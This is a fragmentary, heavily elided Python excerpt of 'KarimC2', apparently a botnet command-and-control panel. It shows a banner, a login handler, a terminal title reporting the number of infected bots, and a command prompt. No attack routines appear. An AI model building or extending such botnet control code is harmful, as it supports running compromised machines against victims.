...
banner_2 = f"""
                KarimC2  
╔══════════════════════════════════════╗
 With great powers comes great resposibillity
╔══════════════════════════════════════╗
...
def handle_client(client, address):
    global num
    send(client, f'\x1b[3;31;40mKarimC2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    color_random = color()
    send(client, f'{Fore.LIGHTBLUE_EX}Connection {Fore.LIGHTGREEN_EX}PUTTY {Fore.LIGHTBLUE_EX} To {Fore.LIGHTYELLOW_EX}KarimC2 Servers {Fore.LIGHTMAGENTA_EX}(OK!)')
...
def update_title(client,name):
    ...
    try:
        send(client, f'\33]0; You are connected via - PuTTY | KarimC2 - [ Infected {len(bots)} | Login {name} ]\a', False)
        time.sleep(2)
    except:
        client.close()
...
def command_line(client):
    ...
    send(client, f"{Fore.GREEN}WELCOME TO KarimC2 -> USER-{user_name} BOTNET-{len(bots)} 📡")
    send(client, f"{Fore.YELLOW} ...")
    prompt = f'{Fore.CYAN}Karim.C2 {Fore.GREEN}> '
            ...
            if command == 'HELP':
                ...
                if len(args) == 3:
                    ...
                    if prompt_code == "OLD_PROMPT":
                        ...
                        prompt = f'{Fore.CYAN}[ {Fore.MAGENTA}KarimC2@{user_name} {Fore.CYAN}] {Fore.GREEN}$ '
